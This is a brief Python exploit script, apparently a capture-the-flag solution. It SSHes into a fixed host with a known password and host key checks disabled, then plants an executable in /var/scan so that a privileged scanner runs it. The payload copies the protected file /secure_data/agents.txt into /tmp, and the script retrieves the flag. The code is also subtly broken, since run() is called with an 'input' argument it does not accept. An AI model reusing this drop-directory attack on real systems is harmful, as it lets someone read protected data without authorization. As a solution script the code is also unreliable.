#!/usr/bin/env python3
"""AppArmor-cé: drop executable in /var/scan, scanner runs it as var_scan_binary."""
import subprocess
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "57.128.112.118"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 14199
USER, PASS = "player", "player"

PAYLOAD = """#!/bin/bash
grep -o 'SHLK{[^}]*}' /secure_data/agents.txt > /tmp/flag_only.txt
cat /secure_data/agents.txt > /tmp/agents_leak.txt
"""


def run(cmd: list[str]) -> str:
    return subprocess.check_output(cmd, text=True)


def main() -> int:
    base = ["sshpass", "-p", PASS, "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null", "-p", str(PORT), f"{USER}@{HOST}"]
    run(base + ["bash", "-s"], input=f"cat > /var/scan/pwn << 'EOF'\n{PAYLOAD}EOF\nchmod +x /var/scan/pwn\n")
    time.sleep(35)
    flag = run(base + ["cat", "/tmp/flag_only.txt"]).strip()
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
